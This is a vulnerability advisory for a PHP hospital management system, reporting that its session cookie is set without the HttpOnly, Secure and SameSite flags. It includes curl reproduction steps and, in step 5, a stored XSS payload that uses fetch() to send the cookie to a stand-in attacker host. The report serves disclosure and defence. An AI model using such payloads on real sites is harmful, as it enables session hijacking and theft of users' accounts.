### Title

`PHPSESSID` is set without `HttpOnly`, `Secure`, or `SameSite` flags, so the session cookie is readable from JavaScript

### Summary

Every PHP endpoint that calls `session_start()` returns a `Set-Cookie` header that contains only the cookie name and value. The `HttpOnly`, `Secure`, and `SameSite` attributes are all missing. The session cookie is therefore readable from JavaScript via `document.cookie`, is transmitted over plain HTTP, and is sent on cross-site requests. Combined with the stored XSS in `contact.php`/`func2.php`/`prescribe.php` and the missing authentication on the dashboards, the cookie is exfiltrable and the session is hijackable.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Cookie Without 'HttpOnly' Flag (CWE-1004)

### Affected Code

The `session_start()` calls happen in every endpoint:

```php
// func.php
session_start();
$con=mysqli_connect("localhost","root","","myhmsdb");
```

```php
// func1.php
session_start();
$con=mysqli_connect("localhost","root","","myhmsdb");
```

```php
// func2.php
session_start();
$con=mysqli_connect("localhost","root","","myhmsdb");
```

```php
// func3.php
session_start();
$con=mysqli_connect("localhost","root","","myhmsdb");
```

```php
// search.php
session_start();
$con=mysqli_connect("localhost","root","","myhmsdb");
```

```php
// logout.php
session_start();
```

```php
// logout1.php
session_start();
```

None of these scripts contains an `ini_set('session.cookie_httponly', '1')` or `session_set_cookie_params(['httponly' => true, 'secure' => true, 'samesite' => 'Lax'])` call.

### Root Cause

The application never configures the session cookie flags. The default `php.ini` shipped with the Docker container (and the typical XAMPP/WAMP `php.ini`) leaves `session.cookie_httponly = 0`, so the application inherits the insecure default.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Trigger a successful login and inspect the `Set-Cookie` header:

```bash
curl -sS -i "$BASE_URL/func3.php" \
  --data-urlencode "adsub=1" \
  --data-urlencode "username1=admin" \
  --data-urlencode "password2=admin123" | grep -i "set-cookie"
```

```text
Set-Cookie: PHPSESSID=bqiror829oclqmb89d7jc308gg; path=/
```

The `HttpOnly`, `Secure`, and `SameSite` attributes are all absent.

3. Confirm the same pattern for every other login endpoint:

```bash
curl -sS -i "$BASE_URL/func.php" \
  --data-urlencode "patsub=1" \
  --data-urlencode "email=ram@gmail.com" \
  --data-urlencode "password2=ram123" | grep -i "set-cookie"
```

```bash
curl -sS -i "$BASE_URL/func1.php" \
  --data-urlencode "docsub1=1" \
  --data-urlencode "username3=ashok" \
  --data-urlencode "password3=ashok123" | grep -i "set-cookie"
```

```text
Set-Cookie: PHPSESSID=...; path=/
```

4. Confirm in the browser that the cookie is exposed to JavaScript. Login as the receptionist, then in the DevTools console:

```javascript
document.cookie
// "PHPSESSID=lnvvn1riclaqhon9mp5182au33"
```

The value is readable from JavaScript without any restriction.

5. Demonstrate the exfiltration chain with a stored XSS payload. The attacker submits a contact form containing:

```html
<script>fetch('http://attacker.example/?c='+document.cookie)</script>
```

When the receptionist opens the Queries tab in `admin-panel1.php`, the script fires and the `PHPSESSID` is sent to the attacker. The attacker replays the cookie in a fresh request and impersonates the receptionist.

### Impact

The combination of missing `HttpOnly` + the stored XSS primitive (CVE-05/06/07) + the missing authentication on the dashboards (CVE-09) makes the session cookie trivially exfiltrable. An attacker who can persuade a receptionist/doctor/patient to load a malicious page (or to whom they have already delivered a stored XSS payload) can:

- Read the `PHPSESSID` value via `document.cookie`.
- Replay the cookie in a fresh request and impersonate the victim.
- Because the cookie is also missing `Secure` / `SameSite`, the same attack works over plain HTTP and across origins.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score: 7.5 (High)
```
